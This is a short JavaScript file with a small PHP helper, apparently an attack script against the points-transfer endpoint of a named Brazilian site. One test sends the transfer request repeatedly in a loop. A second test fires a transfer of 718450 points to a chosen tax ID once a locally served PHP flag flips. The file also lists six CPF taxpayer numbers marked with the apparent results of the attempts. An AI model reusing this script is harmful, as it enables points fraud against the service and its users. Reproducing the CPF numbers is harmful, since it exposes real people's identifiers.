main.js

//010.281.334.56
//005.387.021.25

//https://bo.pipz.com.br/qualificationPoints/transfer

//cpf: 005.387.021-25
//points: 1

//Teste 1
/*
let cfp = '005.387.021.25';
let pontos = 8;

for (var i = 0; i < 10; i++) {
	$.post( "https://bo.pipz.com.br/qualificationPoints/transfer", { cpf: cfp, points: pontos }, function( data ) {
		console.log(data);
	}, "json");
}
*/



//CPF 1: 010.281.334.56 x
//CPF 2: 005.387.021.25 x
//CPF 3: 048.934.704.50 x
//CPF 4: 457.643.524.87 + 
//CPF 5: 087.861.074.02 x 
//CPF 6: 302.904.224.34 <


//Teste 2
let cfp = '457.643.524.87';
let pontos = '718450';
var ini = 1;
setInterval(function(){ 

	
	$.get( "http://127.0.0.1/teste.php", function( data ) {


		if(data=='1' && ini==1){
			console.log('foi');
			ini = 0;
			$.post( "https://bo.pipz.com.br/qualificationPoints/transfer", { cpf: cfp, points: pontos }, function( data ) {
				console.log(data);
				ini = 0;

			}, "json");
			
		}


	});
	
}, 10);

//Codigos em PHP
<?php
	header('Access-Control-Allow-Origin: *');
	header('Content-Type: application/json');

	echo '0';
?>